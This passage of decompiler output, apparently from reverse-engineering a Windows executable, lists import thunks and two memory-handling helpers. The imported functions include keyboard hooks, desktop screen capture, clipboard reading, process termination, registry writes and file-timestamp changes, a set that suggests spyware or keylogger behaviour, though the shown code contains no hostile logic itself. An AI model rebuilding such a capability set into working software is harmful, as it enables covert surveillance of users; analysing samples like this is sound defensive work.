  
                    // WARNING: Could not recover jumptable at 0x00422a20. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = fflush(_File);
  return iVar1;
}



void __cdecl abort(void)

{
                    // WARNING: Could not recover jumptable at 0x00422a30. Too many branches
                    // WARNING: Subroutine does not return
                    // WARNING: Treating indirect jump as call
  abort();
  return;
}



void * __cdecl memset(void *_Dst,int _Val,size_t _Size)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422a40. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = memset(_Dst,_Val,_Size);
  return pvVar1;
}



void _assert(void)

{
                    // WARNING: Could not recover jumptable at 0x00422a50. Too many branches
                    // WARNING: Treating indirect jump as call
  _assert();
  return;
}



HDC CreateCompatibleDC(HDC hdc)

{
  HDC pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422a60. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = CreateCompatibleDC(hdc);
  return pHVar1;
}



HBITMAP CreateCompatibleBitmap(HDC hdc,int cx,int cy)

{
  HBITMAP pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422a68. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = CreateCompatibleBitmap(hdc,cx,cy);
  return pHVar1;
}



HGDIOBJ SelectObject(HDC hdc,HGDIOBJ h)

{
  HGDIOBJ pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422a70. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = SelectObject(hdc,h);
  return pvVar1;
}



BOOL BitBlt(HDC hdc,int x,int y,int cx,int cy,HDC hdcSrc,int x1,int y1,DWORD rop)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422a78. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = BitBlt(hdc,x,y,cx,cy,hdcSrc,x1,y1,rop);
  return BVar1;
}



COLORREF GetPixel(HDC hdc,int x,int y)

{
  COLORREF CVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422a80. Too many branches
                    // WARNING: Treating indirect jump as call
  CVar1 = GetPixel(hdc,x,y);
  return CVar1;
}



BOOL DeleteDC(HDC hdc)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422a88. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = DeleteDC(hdc);
  return BVar1;
}



LRESULT CallNextHookEx(HHOOK hhk,int nCode,WPARAM wParam,LPARAM lParam)

{
  LRESULT LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422a90. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = CallNextHookEx(hhk,nCode,wParam,lParam);
  return LVar1;
}



SHORT GetKeyState(int nVirtKey)

{
  SHORT SVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422a98. Too many branches
                    // WARNING: Treating indirect jump as call
  SVar1 = GetKeyState(nVirtKey);
  return SVar1;
}



BOOL TranslateMessage(MSG *lpMsg)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422aa0. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = TranslateMessage(lpMsg);
  return BVar1;
}



LRESULT DispatchMessageA(MSG *lpMsg)

{
  LRESULT LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422aa8. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = DispatchMessageA(lpMsg);
  return LVar1;
}



BOOL GetMessageA(LPMSG lpMsg,HWND hWnd,UINT wMsgFilterMin,UINT wMsgFilterMax)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422ab0. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = GetMessageA(lpMsg,hWnd,wMsgFilterMin,wMsgFilterMax);
  return BVar1;
}



HHOOK SetWindowsHookExA(int idHook,HOOKPROC lpfn,HINSTANCE hmod,DWORD dwThreadId)

{
  HHOOK pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422ab8. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = SetWindowsHookExA(idHook,lpfn,hmod,dwThreadId);
  return pHVar1;
}



BOOL UnhookWindowsHookEx(HHOOK hhk)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422ac0. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = UnhookWindowsHookEx(hhk);
  return BVar1;
}



HWND GetDesktopWindow(void)

{
  HWND pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422ac8. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = GetDesktopWindow();
  return pHVar1;
}



BOOL GetWindowRect(HWND hWnd,LPRECT lpRect)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422ad0. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = GetWindowRect(hWnd,lpRect);
  return BVar1;
}



HDC GetDC(HWND hWnd)

{
  HDC pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422ad8. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = GetDC(hWnd);
  return pHVar1;
}



int ReleaseDC(HWND hWnd,HDC hDC)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422ae0. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = ReleaseDC(hWnd,hDC);
  return iVar1;
}



int MessageBoxA(HWND hWnd,LPCSTR lpText,LPCSTR lpCaption,UINT uType)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422ae8. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = MessageBoxA(hWnd,lpText,lpCaption,uType);
  return iVar1;
}



BOOL OpenClipboard(HWND hWndNewOwner)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422af0. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = OpenClipboard(hWndNewOwner);
  return BVar1;
}



HANDLE GetClipboardData(UINT uFormat)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422af8. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = GetClipboardData(uFormat);
  return pvVar1;
}



BOOL CloseClipboard(void)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422b00. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = CloseClipboard();
  return BVar1;
}



LPTOP_LEVEL_EXCEPTION_FILTER
SetUnhandledExceptionFilter(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter)

{
  LPTOP_LEVEL_EXCEPTION_FILTER pPVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422b08. Too many branches
                    // WARNING: Treating indirect jump as call
  pPVar1 = SetUnhandledExceptionFilter(lpTopLevelExceptionFilter);
  return pPVar1;
}



void ExitProcess(UINT uExitCode)

{
                    // WARNING: Could not recover jumptable at 0x00422b10. Too many branches
                    // WARNING: Subroutine does not return
                    // WARNING: Treating indirect jump as call
  ExitProcess(uExitCode);
  return;
}



void Sleep(DWORD dwMilliseconds)

{
                    // WARNING: Could not recover jumptable at 0x00422b18. Too many branches
                    // WARNING: Treating indirect jump as call
  Sleep(dwMilliseconds);
  return;
}



BOOL SetFileAttributesA(LPCSTR lpFileName,DWORD dwFileAttributes)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422b20. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = SetFileAttributesA(lpFileName,dwFileAttributes);
  return BVar1;
}



BOOL CloseHandle(HANDLE hObject)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422b28. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = CloseHandle(hObject);
  return BVar1;
}



void GlobalMemoryStatus(LPMEMORYSTATUS lpBuffer)

{
                    // WARNING: Could not recover jumptable at 0x00422b30. Too many branches
                    // WARNING: Treating indirect jump as call
  GlobalMemoryStatus(lpBuffer);
  return;
}



void GetSystemTime(LPSYSTEMTIME lpSystemTime)

{
                    // WARNING: Could not recover jumptable at 0x00422b38. Too many branches
                    // WARNING: Treating indirect jump as call
  GetSystemTime(lpSystemTime);
  return;
}



void GetLocalTime(LPSYSTEMTIME lpSystemTime)

{
                    // WARNING: Could not recover jumptable at 0x00422b40. Too many branches
                    // WARNING: Treating indirect jump as call
  GetLocalTime(lpSystemTime);
  return;
}



HMODULE LoadLibraryA(LPCSTR lpLibFileName)

{
  HMODULE pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422b48. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = LoadLibraryA(lpLibFileName);
  return pHVar1;
}



BOOL SetCurrentDirectoryA(LPCSTR lpPathName)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422b50. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = SetCurrentDirectoryA(lpPathName);
  return BVar1;
}



BOOL CreateProcessA(LPCSTR lpApplicationName,LPSTR lpCommandLine,
                   LPSECURITY_ATTRIBUTES lpProcessAttributes,
                   LPSECURITY_ATTRIBUTES lpThreadAttributes,BOOL bInheritHandles,
                   DWORD dwCreationFlags,LPVOID lpEnvironment,LPCSTR lpCurrentDirectory,
                   LPSTARTUPINFOA lpStartupInfo,LPPROCESS_INFORMATION lpProcessInformation)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422b58. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = CreateProcessA(lpApplicationName,lpCommandLine,lpProcessAttributes,lpThreadAttributes,
                         bInheritHandles,dwCreationFlags,lpEnvironment,lpCurrentDirectory,
                         lpStartupInfo,lpProcessInformation);
  return BVar1;
}



DWORD GetModuleFileNameA(HMODULE hModule,LPSTR lpFilename,DWORD nSize)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422b60. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetModuleFileNameA(hModule,lpFilename,nSize);
  return DVar1;
}



BOOL GetVersionExA(LPOSVERSIONINFOA lpVersionInformation)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422b68. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = GetVersionExA(lpVersionInformation);
  return BVar1;
}



HANDLE CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes,SIZE_T dwStackSize,
                   LPTHREAD_START_ROUTINE lpStartAddress,LPVOID lpParameter,DWORD dwCreationFlags,
                   LPDWORD lpThreadId)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422b70. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = CreateThread(lpThreadAttributes,dwStackSize,lpStartAddress,lpParameter,dwCreationFlags,
                        lpThreadId);
  return pvVar1;
}



HANDLE CreateMailslotA(LPCSTR lpName,DWORD nMaxMessageSize,DWORD lReadTimeout,
                      LPSECURITY_ATTRIBUTES lpSecurityAttributes)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422b78. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = CreateMailslotA(lpName,nMaxMessageSize,lReadTimeout,lpSecurityAttributes);
  return pvVar1;
}



HANDLE CreateFileA(LPCSTR lpFileName,DWORD dwDesiredAccess,DWORD dwShareMode,
                  LPSECURITY_ATTRIBUTES lpSecurityAttributes,DWORD dwCreationDisposition,
                  DWORD dwFlagsAndAttributes,HANDLE hTemplateFile)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422b80. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = CreateFileA(lpFileName,dwDesiredAccess,dwShareMode,lpSecurityAttributes,
                       dwCreationDisposition,dwFlagsAndAttributes,hTemplateFile);
  return pvVar1;
}



BOOL WriteFile(HANDLE hFile,LPCVOID lpBuffer,DWORD nNumberOfBytesToWrite,
              LPDWORD lpNumberOfBytesWritten,LPOVERLAPPED lpOverlapped)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422b88. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = WriteFile(hFile,lpBuffer,nNumberOfBytesToWrite,lpNumberOfBytesWritten,lpOverlapped);
  return BVar1;
}



BOOL ReadFile(HANDLE hFile,LPVOID lpBuffer,DWORD nNumberOfBytesToRead,LPDWORD lpNumberOfBytesRead,
             LPOVERLAPPED lpOverlapped)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422b90. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = ReadFile(hFile,lpBuffer,nNumberOfBytesToRead,lpNumberOfBytesRead,lpOverlapped);
  return BVar1;
}



BOOL GetComputerNameA(LPSTR lpBuffer,LPDWORD nSize)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422b98. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = GetComputerNameA(lpBuffer,nSize);
  return BVar1;
}



HFILE OpenFile(LPCSTR lpFileName,LPOFSTRUCT lpReOpenBuff,UINT uStyle)

{
  HFILE HVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422ba0. Too many branches
                    // WARNING: Treating indirect jump as call
  HVar1 = OpenFile(lpFileName,lpReOpenBuff,uStyle);
  return HVar1;
}



BOOL GetFileTime(HANDLE hFile,LPFILETIME lpCreationTime,LPFILETIME lpLastAccessTime,
                LPFILETIME lpLastWriteTime)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422ba8. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = GetFileTime(hFile,lpCreationTime,lpLastAccessTime,lpLastWriteTime);
  return BVar1;
}



BOOL SetFileTime(HANDLE hFile,FILETIME *lpCreationTime,FILETIME *lpLastAccessTime,
                FILETIME *lpLastWriteTime)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422bb0. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = SetFileTime(hFile,lpCreationTime,lpLastAccessTime,lpLastWriteTime);
  return BVar1;
}



void CreateToolhelp32Snapshot(void)

{
                    // WARNING: Could not recover jumptable at 0x00422bb8. Too many branches
                    // WARNING: Treating indirect jump as call
  CreateToolhelp32Snapshot();
  return;
}



void Process32First(void)

{
                    // WARNING: Could not recover jumptable at 0x00422bc0. Too many branches
                    // WARNING: Treating indirect jump as call
  Process32First();
  return;
}



void Process32Next(void)

{
                    // WARNING: Could not recover jumptable at 0x00422bc8. Too many branches
                    // WARNING: Treating indirect jump as call
  Process32Next();
  return;
}



HANDLE OpenProcess(DWORD dwDesiredAccess,BOOL bInheritHandle,DWORD dwProcessId)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422bd0. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = OpenProcess(dwDesiredAccess,bInheritHandle,dwProcessId);
  return pvVar1;
}



BOOL TerminateProcess(HANDLE hProcess,UINT uExitCode)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422bd8. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = TerminateProcess(hProcess,uExitCode);
  return BVar1;
}



LPVOID GlobalLock(HGLOBAL hMem)

{
  LPVOID pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422be0. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = GlobalLock(hMem);
  return pvVar1;
}



BOOL GlobalUnlock(HGLOBAL hMem)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422be8. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = GlobalUnlock(hMem);
  return BVar1;
}



DWORD GetTickCount(void)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422bf0. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetTickCount();
  return DVar1;
}



LONG InterlockedIncrement(LONG *lpAddend)

{
  LONG LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422c18. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = InterlockedIncrement(lpAddend);
  return LVar1;
}



LPSTR GetCommandLineA(void)

{
  LPSTR pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422c28. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = GetCommandLineA();
  return pCVar1;
}



void GetStartupInfoA(LPSTARTUPINFOA lpStartupInfo)

{
                    // WARNING: Could not recover jumptable at 0x00422c30. Too many branches
                    // WARNING: Treating indirect jump as call
  GetStartupInfoA(lpStartupInfo);
  return;
}



HMODULE GetModuleHandleA(LPCSTR lpModuleName)

{
  HMODULE pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422c38. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = GetModuleHandleA(lpModuleName);
  return pHVar1;
}



LONG InterlockedDecrement(LONG *lpAddend)

{
  LONG LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422c70. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = InterlockedDecrement(lpAddend);
  return LVar1;
}



LSTATUS RegOpenKeyExA(HKEY hKey,LPCSTR lpSubKey,DWORD ulOptions,REGSAM samDesired,PHKEY phkResult)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422c80. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegOpenKeyExA(hKey,lpSubKey,ulOptions,samDesired,phkResult);
  return LVar1;
}



LSTATUS RegQueryValueExA(HKEY hKey,LPCSTR lpValueName,LPDWORD lpReserved,LPDWORD lpType,
                        LPBYTE lpData,LPDWORD lpcbData)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422c88. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegQueryValueExA(hKey,lpValueName,lpReserved,lpType,lpData,lpcbData);
  return LVar1;
}



LSTATUS RegCloseKey(HKEY hKey)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422c90. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegCloseKey(hKey);
  return LVar1;
}



LSTATUS RegCreateKeyExA(HKEY hKey,LPCSTR lpSubKey,DWORD Reserved,LPSTR lpClass,DWORD dwOptions,
                       REGSAM samDesired,LPSECURITY_ATTRIBUTES lpSecurityAttributes,PHKEY phkResult,
                       LPDWORD lpdwDisposition)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422c98. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegCreateKeyExA(hKey,lpSubKey,Reserved,lpClass,dwOptions,samDesired,lpSecurityAttributes,
                          phkResult,lpdwDisposition);
  return LVar1;
}



LSTATUS RegSetValueExA(HKEY hKey,LPCSTR lpValueName,DWORD Reserved,DWORD dwType,BYTE *lpData,
                      DWORD cbData)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422ca0. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegSetValueExA(hKey,lpValueName,Reserved,dwType,lpData,cbData);
  return LVar1;
}



HINSTANCE ShellExecuteA(HWND hwnd,LPCSTR lpOperation,LPCSTR lpFile,LPCSTR lpParameters,
                       LPCSTR lpDirectory,INT nShowCmd)

{
  HINSTANCE pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00422cb0. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = ShellExecuteA(hwnd,lpOperation,lpFile,lpParameters,lpDirectory,nShowCmd);
  return pHVar1;
}



void __cdecl FUN_00422cd0(void **param_1,undefined4 *param_2,undefined4 *param_3)

{
  undefined4 uVar1;
  void *pvVar2;
  int iVar3;
  void *_Dst;
  int iVar4;
  undefined4 *puVar5;
  size_t _Size;
  uint _Size_00;
  
  puVar5 = (undefined4 *)param_1[1];
  if (puVar5 != (undefined4 *)param_1[2]) {
    if (puVar5 != (undefined4 *)0x0) {
      *puVar5 = puVar5[-1];
    }
    uVar1 = *param_3;
    param_1[1] = puVar5 + 1;
    _Size_00 = (int)puVar5 + (-4 - (int)param_2) & 0xfffffffc;
    memmove((void *)((int)puVar5 - _Size_00),param_2,_Size_00);
    *param_2 = uVar1;
    return;
  }
  iVar4 = 1;
  iVar3 = (int)puVar5 - (int)*param_1 >> 2;
  if (iVar3 != 0) {
    iVar4 = iVar3 * 2;
  }
  _Dst = FUN_0041f6b0(iVar4 * 4);
  _Size = (int)param_2 - (int)*param_1;
  memmove(_Dst,*param_1,_Size);
  puVar5 = (undefined4 *)((int)_Dst + _Size);
  if (puVar5 != (undefined4 *)0x0) {
    *puVar5 = *param_3;
  }
  pvVar2 = param_1[1];
  memmove(puVar5 + 1,param_2,(int)pvVar2 - (int)param_2);
  if (*param_1 != (void *)0x0) {
    FUN_0041f7c0(*param_1);
  }
  param_1[1] = (void *)(((int)pvVar2 - (int)param_2) + (int)(puVar5 + 1));
  *param_1 = _Dst;
  param_1[2] = (void *)((int)_Dst + iVar4 * 4);
  return;
}



void * __cdecl FUN_00422de0(int param_1,void *param_2,void *param_3)

{
  memmove(param_2,param_3,*(int *)(param_1 + 4) - (int)param_3);
  *(int *)(param_1 + 4) = *(int *)(param_1 + 4) - ((int)param_3 - (int)param_2 & 0xfffffffcU);
  return param_2;
}


